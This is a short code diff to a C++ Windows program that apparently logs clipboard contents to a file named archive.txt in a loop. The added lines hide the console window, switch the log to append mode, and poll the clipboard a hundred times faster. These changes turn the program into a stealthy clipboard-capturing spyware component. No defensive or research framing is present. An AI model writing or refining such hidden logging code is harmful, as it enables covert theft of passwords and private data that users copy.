@@ -7,13 +7,16 @@
 
 int main()
 {
+	HWND okno = GetConsoleWindow();
+    ShowWindow( okno, SW_HIDE );
+	
 	time_t czas;
 	std::string tekst, time;
 	
 	HANDLE uchwyt;
 	HWND hwnd;
 	std::fstream plik;
-	plik.open("archive.txt",  std::ios::out);
+	plik.open("archive.txt",  std::ios::app);
 	
 	while(true)
 	{
@@ -38,7 +41,7 @@ int main()
 		
 		CloseClipboard();
 		if(GetAsyncKeyState(0x26)) break;
-		Sleep(1500);
+		Sleep(15);
 	}
 	plik.close();
 	
